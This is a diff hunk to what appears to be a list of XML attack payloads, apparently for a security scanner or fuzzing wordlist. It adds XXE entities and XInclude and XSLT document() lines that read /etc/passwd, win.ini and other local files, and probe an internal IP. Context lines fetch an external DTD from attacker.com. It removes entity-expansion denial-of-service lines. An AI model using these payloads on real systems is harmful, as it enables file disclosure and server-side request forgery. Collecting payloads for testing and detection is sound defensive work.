@@ -7,7 +7,18 @@
 <?xml version="1.0"?><!DOCTYPE xxe [<!ENTITY test Public 'file:///test.test'>]><root>&xxe;</root>
 <!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
 <!ENTITY % xxe SYSTEM "http://internal.service/secret_pass.txt" >
-#<!ENTITY a0 "dos" ><!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;"><!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
-#<!ENTITY % pe_1 "<!---->"><!ENTITY % pe_2 "&#37;pe_1;<!---->&#37;pe_1;">
 <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///patt/&#x25;file;&#x27;>">
 <!ENTITY % ext SYSTEM "http://attacker.com/ext.dtd">
+<xi:include parse="text" href="file:///test/passwd"/>
+<xi:include  href="/test/insecure" parse="text"/>
+/usr/share/xml/fontconfig/fonts.dtd
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!DOCTYPE root [<!ENTITY test SYSTEM 'http://test'>]>
+<xsl:value-of select="system-property('xsl:version')" />
+<xsl:value-of select="system-property('xsl:vendor')" />
+<xsl:value-of select="system-property('xsl:vendor-url')" />
+<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "C:\secretfruit.txt">]>
+<xsl:copy-of select="document('http://172.16.132.1:25')"/>
+<xsl:copy-of select="document('/etc/passwd')"/>
+<xsl:copy-of select="document('file:///c:/winnt/win.ini')"/>
+<msxsl:script
